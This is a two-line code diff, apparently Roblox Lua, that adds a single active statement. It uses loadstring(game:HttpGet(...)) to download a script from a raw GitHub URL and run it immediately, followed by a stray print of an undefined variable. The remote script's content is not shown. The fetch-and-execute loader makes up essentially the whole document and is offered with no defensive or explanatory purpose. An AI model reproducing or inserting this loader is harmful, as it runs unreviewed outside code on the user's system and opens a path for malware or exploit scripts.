@@ -1,0 +1,2 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/hinoaki2sabu/FS/refs/heads/main/test'),true))()
+print(lol)
